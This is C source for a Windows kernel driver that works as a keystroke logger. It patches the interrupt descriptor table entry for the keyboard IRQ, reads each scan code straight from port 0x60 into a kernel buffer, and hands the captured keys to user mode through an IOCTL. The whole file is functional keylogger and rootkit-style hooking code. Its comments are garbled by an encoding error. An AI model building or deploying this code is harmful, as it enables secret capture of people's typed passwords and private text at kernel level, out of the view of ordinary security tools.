#include <ntddk.h>
#include <windef.h>
#include <stdlib.h>
#include <my_driver.h>

#define	DEVICE_NAME			L"\\Device\\keyboard"
#define LINK_NAME			L"\\DosDevices\\keyboard"

#define IOCTL_SAY_HELLO	     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_GET_CONTENT      CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

int HOOKIDT();
void UNHOOKIDT();
VOID MyPortFilter();
VOID MyInterruptProc();
void content_delete();
void content_push(P2C_U8);
P2C_U8 p2cSeachOrSetIrq1(P2C_U8);
P2C_U8 p2cCopyANewIdt(P2C_U8 , void * );
void p2cResetIoApic(BOOLEAN );
P2C_U8 p2cGetIdleIdtVec();
P2C_U8 search_for_irq1_idtnum();

P2C_U8 sch_pre = 0;
P2C_U8 sch_pre_pre = 0;
P2C_U8 IRQ1_IDTNUM = 0;
KSPIN_LOCK SpinLock_keyboard;
KSPIN_LOCK SpinLock_content;
UCHAR KbBuff[128] = { 0 };
ULONG CurPos = 0;


void *Origin_address; //HOOK IRQ1_IDTNUM ʱ������ԭʼ��ַ
PVOID buffer; //���建����
size_t buffer_use_count = 0;
//��һ��������Ҫ�޸ģ�Ϊȱʡ������ж�غ���
VOID DriverUnload(PDRIVER_OBJECT pDriverObj)
{
	UNICODE_STRING strLink;
	DbgPrint("[KeyBoard]DriverUnload\n");
	RtlInitUnicodeString(&strLink, LINK_NAME);
	IoDeleteSymbolicLink(&strLink);
	IoDeleteDevice(pDriverObj->DeviceObject);
	UNHOOKIDT();
	//p2cResetIoApic(FALSE);
}

//��һ��������Ҫ�޸ģ�Ϊȱʡ��������װ����
NTSTATUS DispatchCreate(PDEVICE_OBJECT pDevObj, PIRP pIrp)
{
	DbgPrint("[KeyBoard]DispatchCreate\n");
	pIrp->IoStatus.Status = STATUS_SUCCESS;
	pIrp->IoStatus.Information = 0;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

//��һ��������Ҫ�޸ģ�Ϊȱʡ�������˳�����
NTSTATUS DispatchClose(PDEVICE_OBJECT pDevObj, PIRP pIrp)
{
	DbgPrint("[KeyBoard]DispatchClose\n");
	pIrp->IoStatus.Status = STATUS_SUCCESS;
	pIrp->IoStatus.Information = 0;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

//IRP_MJ_DEVICE_CONTROL��Ӧ�Ĵ������̣���������Ҫ�ĺ���֮һ��һ��������;�������������ܵĳ��򣬶��ᾭ���������
NTSTATUS DispatchIoctl(PDEVICE_OBJECT pDevObj, PIRP pIrp)
{
	NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;
	PIO_STACK_LOCATION pIrpStack;
	ULONG uIoControlCode;
	PVOID pIoBuffer;
	ULONG uInSize;
	ULONG uOutSize;
	KIRQL CurIrql, OldIrql;
	DbgPrint("[KeyBoard]DispatchIoctl\n");
	pIrpStack = IoGetCurrentIrpStackLocation(pIrp);
	uIoControlCode = pIrpStack->Parameters.DeviceIoControl.IoControlCode;
	pIoBuffer = pIrp->AssociatedIrp.SystemBuffer;
	uInSize = pIrpStack->Parameters.DeviceIoControl.InputBufferLength;
	uOutSize = pIrpStack->Parameters.DeviceIoControl.OutputBufferLength;
	switch (uIoControlCode)
	{
	case IOCTL_GET_CONTENT:
	{
		KeAcquireSpinLock(&SpinLock_content, &OldIrql);
		memcpy(pIoBuffer, buffer, 255);
		KeReleaseSpinLock(&SpinLock_content, OldIrql);
		content_delete();
		DbgPrint("[KeyBoard]May be I have done something\n");
		status = STATUS_SUCCESS;
		break;
	}
	case IOCTL_SAY_HELLO:
	{
		DbgPrint("[KeyBoard]IOCTL_SAY_HELLO\n");
		status = STATUS_SUCCESS;
		break;
	}
	}
	if (status == STATUS_SUCCESS)
		pIrp->IoStatus.Information = uOutSize;
	else
		pIrp->IoStatus.Information = 0;
	pIrp->IoStatus.Status = status;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return status;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING pRegistryString) {
	NTSTATUS status = STATUS_SUCCESS;
	UNICODE_STRING ustrLinkName;
	UNICODE_STRING ustrDevName;
	PDEVICE_OBJECT pDevObj;
	pDriverObj->MajorFunction[IRP_MJ_CREATE] = DispatchCreate;
	pDriverObj->MajorFunction[IRP_MJ_CLOSE] = DispatchClose;
	pDriverObj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchIoctl;
	pDriverObj->DriverUnload = DriverUnload;

	//����ȫ�ֻ�����
	buffer = ExAllocatePool(PagedPool,0x100);

	RtlInitUnicodeString(&ustrDevName, DEVICE_NAME);
	status = IoCreateDevice(pDriverObj, 0, &ustrDevName, FILE_DEVICE_UNKNOWN, 0, FALSE, &pDevObj);
	if (!NT_SUCCESS(status))	return status;

	RtlInitUnicodeString(&ustrLinkName, LINK_NAME);
	status = IoCreateSymbolicLink(&ustrLinkName, &ustrDevName);
	if (!NT_SUCCESS(status))
	{
		IoDeleteDevice(pDevObj);
		return status;
	}
	DbgPrint("[KeyBoard]DriverEntry\n");
	DbgPrint("[KeyBoard]Prepare for Hook or IOAPIC\n");
	IRQ1_IDTNUM = search_for_irq1_idtnum();
	DbgPrint("[KeyBoard]We have found that Your IRQ1's IDT num is 0x%2x\n", IRQ1_IDTNUM);

	if (IRQ1_IDTNUM == NULL) {
		DbgPrint("[KeyBoard]Bad IDT number,driver will exit\n");
		return STATUS_SUCCESS;
	}

	//p2cResetIoApic(TRUE);
	HOOKIDT();

	return STATUS_SUCCESS;
}


int HOOKIDT() {
	P2C_IDTR idtr;
	_asm sidt idtr
	PP2C_IDTENTRY idt_addr = (PP2C_IDTENTRY)(void *)idtr.base;
	idt_addr += IRQ1_IDTNUM;
	void * fake = NULL;
	KdPrint(("IDT:%x\n",idt_addr));
	DbgPrint("[KeyBoard]start to HOOK INT 0x%2x , now address: %x\n",IRQ1_IDTNUM ,(void *)P2C_MAKELONG(idt_addr->offset_low, idt_addr->offset_high) );
	Origin_address = (void *)P2C_MAKELONG(idt_addr->offset_low, idt_addr->offset_high);
	idt_addr->offset_low = P2C_LOW16_OF_32(MyInterruptProc);
	idt_addr->offset_high = P2C_HIGH16_OF_32(MyInterruptProc);
	DbgPrint("[KeyBoard]HOOK INT 0x%2x End, now address: %x\n", IRQ1_IDTNUM,(void *)P2C_MAKELONG(idt_addr->offset_low, idt_addr->offset_high));
}

void UNHOOKIDT() {
	P2C_IDTR idtr;
	_asm sidt idtr
	PP2C_IDTENTRY idt_addr = (PP2C_IDTENTRY)idtr.base;
	if (Origin_address == NULL) {
		DbgPrint("[KeyBoard]��Ч�ĵ�ַ���޷��ָ�INT 0x%2x�����ж�\n",IRQ1_IDTNUM);
		return;
	}

	idt_addr += IRQ1_IDTNUM;
	DbgPrint("[KeyBoard]start to HOOK INT 0x%2x , now address: %x\n", IRQ1_IDTNUM,(void *)P2C_MAKELONG(idt_addr->offset_low, idt_addr->offset_high));
	idt_addr->offset_low = P2C_LOW16_OF_32(Origin_address);
	idt_addr->offset_high = P2C_HIGH16_OF_32(Origin_address);

	DbgPrint("[KeyBoard]HOOK INT 0x%2x End, now address: %x\n",IRQ1_IDTNUM ,(void *)P2C_MAKELONG(idt_addr->offset_low, idt_addr->offset_high));
}


__declspec(naked) VOID MyInterruptProc()
{
	__asm
	{
		pushad								// �������е�ͨ�üĴ���
		pushfd								// �����־�Ĵ���
		push fs
		mov bx, 0x30
		mov fs, bx							//fs�μĴ������ں�ֵ̬�̶�Ϊ0x30
		push ds
		push es
	
		call MyPortFilter

		pop es
		pop ds
		pop fs
		popfd								// �ָ���־�Ĵ���
		popad								// �ָ�ͨ�üĴ���
		jmp Origin_address					// ����ԭ�����жϷ������
	}
}

//�����ϰ�������֮��cpu�Ὣ��Ϣ���͵�0x60�˿ڣ������ڶ�֮ǰ��������Զ˿��Ƿ�ɶ�
//���8042����
ULONG p2cWaitForKbRead()
{
	int i = 100;
	P2C_U8 mychar;
	do
	{
		_asm in al, 0x64
		_asm mov mychar, al
		KeStallExecutionProcessor(50);//ʹCPU��ͣ�ض���΢�ʹ������ʱ��ȥ����һЩ����
		if (!(mychar & OBUFFER_FULL)) break;//��üĴ������ݣ����ݱ�־λ�ж϶��Ƿ����
	} while (i--);
	if (i) return TRUE;  //��������жϲ��ɹ�����ô��Ϊ����ٵİ�������������ʵ�İ���
	return FALSE;
}

//ͬ���ģ��ȴ��˿ڿ�д
ULONG p2cWaitForKbWrite()
{
	int i = 100;
	P2C_U8 mychar;
	do
	{
		_asm in al, 0x64
		_asm mov mychar, al
		KeStallExecutionProcessor(50);
		if (!(mychar & IBUFFER_FULL)) break; //д�����жϵı�־λ��ͬ��0x00000001
	} while (i--);
	if (i) return TRUE;
	return FALSE;
}

BOOLEAN FLAG_OXE0 = FALSE;

VOID MyPortFilter() {
	//static P2C_U8 sch_pre = 0;
	P2C_U8	sch;
	KIRQL CurIrql, OldIrql;
	CurIrql = KeGetCurrentIrql();
	p2cWaitForKbRead();
	//ֱ�Ӷ�0x60�˿ڵ�ɨ����
	sch = READ_PORT_UCHAR((PUCHAR)0x60);
	//�ж��Ƿ�����չ�ַ����ߵ�ǰ�Ƿ�����չ״̬
	if (sch != 0xE0 && FLAG_OXE0 == FALSE) {
		if (sch_pre != sch)
		{
			//Ϊ����ظ��жϵ����������
			//��0x60�˿�дʱ���ٴ������ж�
			sch_pre = sch;
			p2cWaitForKbWrite();
			//��CPU����д�˿�����
			_asm mov al, 0xd2
			_asm out 0x64, al
			p2cWaitForKbWrite();
			//д�˿�
			_asm mov al, sch
			_asm out 0x60, al
			//���浽����ռ�
			content_push(sch);
			KdPrint(("p2c: scan code = %2x\r\n",sch));
		}
	}
	else if (sch == 0xE0) {  //��չ�ַ�
		FLAG_OXE0 = TRUE;
		KdPrint(("p2c: find a 0xE0 flag!\r\n"));
		content_push(sch);
	}
	else if (FLAG_OXE0 == TRUE) { //��һ�η���
		FLAG_OXE0 = FALSE;
		KdPrint(("p2c: find a 0xE0 code = %2x!\r\n", sch));
		content_push(sch);
	}
}

void content_push(P2C_U8 sch){
	P2C_U8 * content = (P2C_U8 *)buffer;
	static int maxcount = 0XFF;
	KIRQL CurIrql, OldIrql;
	if (buffer_use_count < maxcount) {
		KeAcquireSpinLock(&SpinLock_content, &OldIrql);
		content[buffer_use_count] = sch;
		buffer_use_count++;
		KeReleaseSpinLock(&SpinLock_content, OldIrql);
	}
}

void content_delete() {
	P2C_U8 * content = (P2C_U8 *)buffer;
	KIRQL CurIrql, OldIrql;
	KeAcquireSpinLock(&SpinLock_content, &OldIrql);
	buffer_use_count = 0; //����Ϊ0�����ɾ��
	memset(content,0,255);
	KeReleaseSpinLock(&SpinLock_content, OldIrql);
}

//����IRQ1���ж�
P2C_U8 p2cSeachOrSetIrq1(P2C_U8 new_ch)
{
	// ѡ��Ĵ�����ѡ��Ĵ�����Ȼ��32λ�ļĴ���������ֻʹ��
	// ��8λ��������λ����������
	P2C_U8 *io_reg_sel;

	// ���ڼĴ�����������д��ѡ��Ĵ���ѡ���ֵ����32λ�ġ�
	P2C_U32 *io_win;
	P2C_U32 ch, ch1;

	// ����һ�������ַ�������ַΪ0xfec00000������IOAPIC--�жϷַ�
	// �Ĵ�������Windows�ϵĿ�ʼ��ַ
	PHYSICAL_ADDRESS	phys;
	PVOID paddr;
	RtlZeroMemory(&phys, sizeof(PHYSICAL_ADDRESS));
	phys.u.LowPart = 0xfec00000;

	// �����ַ�ǲ���ֱ�Ӷ�д�ġ�MmMapIoSpace�������ַӳ��
	// Ϊϵͳ�ռ�������ַ��0x14����Ƭ�ռ�ĳ��ȡ�
	paddr = MmMapIoSpace(phys, 0x14, MmNonCached);

	// ���ӳ��ʧ���˾ͷ���0.
	if (!MmIsAddressValid(paddr))
		return 0;

	// ѡ��Ĵ�����ƫ��Ϊ0
	io_reg_sel = (P2C_U8 *)paddr;
	// ���ڼĴ�����ƫ��Ϊ0x10.
	io_win = (P2C_U32 *)((P2C_U8 *)(paddr)+0x10);

	// ѡ���0x12���պ���irq1����
	*io_reg_sel = 0x12;
	ch = *io_win;

	// ���new_ch��Ϊ0�����Ǿ�������ֵ�������ؾ�ֵ��
	// �����µ��жϺ�
	if (new_ch != 0)
	{
		ch1 = *io_win;
		ch1 &= 0xffffff00;
		ch1 |= (P2C_U32)new_ch;
		*io_win = ch1;
		KdPrint(("p2cSeachOrSetIrq1: set %2x to irq1.\r\n", (P2C_U8)new_ch));
	}

	// ���ڼĴ����������ֵ��32λ�ģ���������ֻ��Ҫ
	// һ���ֽھͿ����ˡ�����ֽھ����ж�������ֵ��
	// һ������Ҫ�޸����ֵ��
	ch &= 0xff;
	MmUnmapIoSpace(paddr, 0x14);
	KdPrint(("p2cSeachOrSetIrq1: the old vec of irq1 is %2x.\r\n", (P2C_U8)ch));
	return (P2C_U8)ch;
}

P2C_U8 p2cGetIdleIdtVec()
{
	P2C_U8 i;
	PP2C_IDTENTRY idt_addr;
	P2C_IDTR idtr;
	_asm sidt idtr
	idt_addr = (PP2C_IDTENTRY)idtr.base;

	// ��20������4a
	for (i = 0x20; i<0x4a; i++)
	{
		// �������Ϊ0˵���ǿ���λ�ã�����
		if (idt_addr[i].type == 0)
		{
			return i;
		}
	}
	return 0;
}

P2C_U8 p2cCopyANewIdt(P2C_U8 id, void *interrupt_proc)
{
	// ����д��һ���µ��ж��š��������ȫ����ԭ����
	// ��idtentry��ֻ���жϴ������ĵ�ַ��ͬ��
	PP2C_IDTENTRY idt_addr;
	P2C_IDTR idtr;
	_asm sidt idtr
	idt_addr = (PP2C_IDTENTRY)idtr.base;
	idt_addr[id] = idt_addr[IRQ1_IDTNUM]; //�����жϴ�����֮�⣬��ȫ����IRQ1_IDTNUM���жϣ������������õļ���
	idt_addr[id].offset_low = P2C_LOW16_OF_32(interrupt_proc);
	idt_addr[id].offset_high = P2C_HIGH16_OF_32(interrupt_proc);
	return id;
}

void p2cResetIoApic(BOOLEAN set_or_recovery)
{
	static P2C_U8 idle_id = 0;
	PP2C_IDTENTRY idt_addr;
	P2C_IDTR idtr;
	_asm sidt idtr
	idt_addr = (PP2C_IDTENTRY)idtr.base;
	P2C_U8 old_id = 0;

	if (set_or_recovery)
	{
		// ԭ��������ڡ�
		P2C_IDTR idtr;
		_asm sidt idtr
		idt_addr = (PP2C_IDTENTRY)idtr.base;
		idt_addr += IRQ1_IDTNUM;
		Origin_address = (void *)P2C_MAKELONG(idt_addr->offset_low, idt_addr->offset_high);

		// Ȼ����һ������λ����irq1�����ж��Ÿ���һ����ȥ��
		// �������ת������дΪ���ǵ��µĴ�������
		idle_id = p2cGetIdleIdtVec();
		if (idle_id != 0)
		{
			p2cCopyANewIdt(idle_id, MyInterruptProc);
			// Ȼ�����¶�λ������жϡ�
			old_id = p2cSeachOrSetIrq1(idle_id);

			//�ж�ԭʼ���ж��ǲ���IRQ1_IDTNUM��������ǣ����ָܻ��������
			ASSERT(old_id == IRQ1_IDTNUM);
		}
	}
	else
	{
		// �����Ҫ�ָ�
		old_id = p2cSeachOrSetIrq1(IRQ1_IDTNUM);
		//�ж��Ƿ����ȷ��IDT�������
		ASSERT(old_id == idle_id);
		// �����Ǹ��ж���û���ˣ�����type = 0ʹ֮����
		idt_addr[old_id].type = 0;
	}
}

//������ǰ����������irq1��Ӧ��idt���
P2C_U8 search_for_irq1_idtnum() {
	P2C_U8 *io_reg_sel;
	P2C_U32 *io_win;
	P2C_U32 ch, ch1;
	PHYSICAL_ADDRESS	phys;
	PVOID paddr;
	RtlZeroMemory(&phys, sizeof(PHYSICAL_ADDRESS));
	phys.u.LowPart = 0xfec00000;
	paddr = MmMapIoSpace(phys, 0x14, MmNonCached);
	if (!MmIsAddressValid(paddr))
		return 0;
	io_reg_sel = (P2C_U8 *)paddr;
	io_win = (P2C_U32 *)((P2C_U8 *)(paddr)+0x10);
	*io_reg_sel = 0x12;
	ch = *io_win;
	return (P2C_U8)ch;
}